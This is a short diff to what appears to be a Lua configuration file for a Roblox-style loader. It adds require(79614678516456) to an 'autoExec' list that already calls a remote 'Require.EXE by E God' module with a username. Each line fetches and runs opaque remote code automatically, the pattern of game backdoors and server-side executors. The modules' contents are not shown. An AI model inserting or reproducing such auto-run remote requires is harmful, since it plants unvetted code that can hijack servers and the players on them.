@@ -15,6 +15,7 @@ return {
 	-- You can add any scripts here
 	["autoExec"] = {
 		[[print("Welcome %username%!")]],
+		[[require(79614678516456)]],
 		[[print("Processes done!")]],
 		[[require(125992639027440)["Require.EXE by E God"](%username%)]],
 		[[print("Heheheheh. umm *splashes all over table*")]],
